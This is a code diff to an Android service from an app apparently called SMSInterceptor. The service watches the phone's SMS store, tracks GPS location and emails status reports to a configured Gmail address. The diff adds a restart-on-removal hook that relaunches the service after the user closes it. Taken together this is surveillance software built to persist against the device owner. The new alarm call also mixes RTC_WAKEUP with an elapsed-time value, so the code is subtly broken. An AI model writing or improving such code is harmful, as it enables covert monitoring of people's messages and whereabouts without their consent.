@@ -5,9 +5,12 @@ import android.os.IBinder;
 import android.os.Handler;
 import android.os.Message;
 import android.os.Messenger;
+import android.os.SystemClock; 
 
 import android.app.Service;
 import android.app.Activity;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 
 import android.content.Intent;
 import android.content.Context;
@@ -22,6 +25,7 @@ import android.net.Uri;
 import java.lang.Double;
 import android.util.Log;
 import android.widget.Toast;
+import android.support.annotation.Nullable;
 import android.telephony.SmsManager;
 import android.database.ContentObserver;
 
@@ -137,55 +141,65 @@ public class SMSService extends Service implements LocationListener {
   }
 
   @Override
+  public void onTaskRemoved(Intent intent) {
+    Intent i = new Intent(getApplicationContext(), SMSService.class);
+    PendingIntent pendingIntent = PendingIntent.getService(this, 1, i, PendingIntent.FLAG_ONE_SHOT);
+    AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+    alarmManager.set(AlarmManager.RTC_WAKEUP, SystemClock.elapsedRealtime() + 5000, pendingIntent);
+    super.onTaskRemoved(intent);
+  }
+
+  @Nullable
+  @Override
   public int onStartCommand(Intent intent, int flag, int startId) throws NullPointerException {
+    super.onStartCommand(intent, flag, startId);
 
-      Log.d(TAG, "onStartCommand() Entering onStartCommand method.");
+    Log.d(TAG, "onStartCommand() Entering onStartCommand method.");
 
-      locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+    locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
  
-      if(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-        Log.d(TAG, "onStartCommand() eLocation = TRUE");
-        eLocation = true;
-      }
-      else {
-        Log.d(TAG, "onStartCommand() eLocation = FALSE");
-        eLocation = false;
-      }
+    if(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+      Log.d(TAG, "onStartCommand() eLocation = TRUE");
+      eLocation = true;
+    }
+    else {
+      Log.d(TAG, "onStartCommand() eLocation = FALSE");
+      eLocation = false;
+    }
 
-      //String data;
-      //if(!eLocation && data != null && intent.hasExtra("obtainLocation")) {
-      try {
-        if(!eLocation && intent.hasExtra("obtainLocation")) {
-          new Thread(new Runnable() {
+    //String data;
+    //if(!eLocation && data != null && intent.hasExtra("obtainLocation")) {
+    try {
+      if(!eLocation && intent.hasExtra("obtainLocation")) {
+        new Thread(new Runnable() {
 
-            @Override
-            public void run() {
-              try {
-                sender = new GmailSender();
-                sender.sendMail("SMSInterceptor", "GPS is not enabled. Cannot obtain location.", gmailEmailString);
-              }
-              catch(Exception e) {
-                e.printStackTrace();
-                Log.e(TAG, "onStartCommand() Exception e " + e.toString());
-              }
+          @Override
+          public void run() {
+            try {
+              sender = new GmailSender();
+              sender.sendMail("SMSInterceptor", "GPS is not enabled. Cannot obtain location.", gmailEmailString);
             }
-          }).start();
-        }
-        else if(eLocation && intent.hasExtra("obtainLocation")) {
-          mLocation = true;
-        }
+            catch(Exception e) {
+              e.printStackTrace();
+              Log.e(TAG, "onStartCommand() Exception e " + e.toString());
+            }
+          }
+        }).start();
       }
-      catch(NullPointerException e) {
-        Log.e(TAG, "onStartCommand() NullPointerException e " + e.toString());
+      else if(eLocation && intent.hasExtra("obtainLocation")) {
+        mLocation = true;
       }
+    }
+    catch(NullPointerException e) {
+      Log.e(TAG, "onStartCommand() NullPointerException e " + e.toString());
+    }
 
-      locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,30000,10,this);
+    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,30000,10,this);
 
-      Handler mSmsObserverHandler = new Handler();
-      //ContentResolver contentResolver = getContentResolver();
-      ContentResolver contentResolver = this.getApplicationContext().getContentResolver();
-      SMSObserver smsObserver = new SMSObserver(mSmsObserverHandler, getApplicationContext());
-      contentResolver.registerContentObserver(Uri.parse("content://sms/"), true, smsObserver);
+    Handler mSmsObserverHandler = new Handler();
+    ContentResolver contentResolver = this.getApplicationContext().getContentResolver();
+    SMSObserver smsObserver = new SMSObserver(mSmsObserverHandler, getApplicationContext());
+    contentResolver.registerContentObserver(Uri.parse("content://sms/"), true, smsObserver);
 
     return START_STICKY;
   }
